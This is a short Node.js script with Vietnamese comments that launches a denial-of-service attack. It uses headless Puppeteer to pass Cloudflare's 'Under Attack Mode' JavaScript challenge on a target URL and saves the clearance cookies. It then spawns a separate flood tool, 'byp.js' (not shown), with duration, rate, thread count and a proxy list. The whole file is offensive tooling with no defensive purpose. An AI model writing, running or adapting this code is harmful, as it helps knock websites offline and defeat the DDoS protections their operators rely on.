const puppeteer = require('puppeteer');
const fs = require('fs');
const { spawn } = require('child_process');

const targetUrl = process.argv[2];
const time = process.argv[3];
const rate = process.argv[4];
const threads = process.argv[5];
const proxyFile = process.argv[6];

if (!targetUrl || !time || !rate || !threads || !proxyFile) {
  console.log('Usage: node start.js <target> <time> <rate> <threads> <proxy.txt>');
  process.exit(1);
}

(async () => {
  console.log(`[>] Đang mở trình duyệt để vượt UAM: ${targetUrl}`);
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  await page.goto(targetUrl, { waitUntil: 'networkidle2' });

  // Chờ thêm để Cloudflare xử lý xong (JS Challenge mất khoảng 5-7 giây)
  await page.waitForTimeout(8000);

  const cookies = await page.cookies();
  fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
  console.log('[✔] Cookie đã được lưu vào cookies.json');

  await browser.close();

  // Bắt đầu gọi tool byp.js
  console.log(`[>] Gọi tool byp.js với cookie đã lấy...`);

  const child = spawn('node', [
    'byp.js',
    targetUrl,
    time,
    rate,
    threads,
    proxyFile
  ], {
    stdio: 'inherit'
  });

  child.on('close', (code) => {
    console.log(`[i] Tool byp.js đã kết thúc với mã thoát ${code}`);
  });
})();
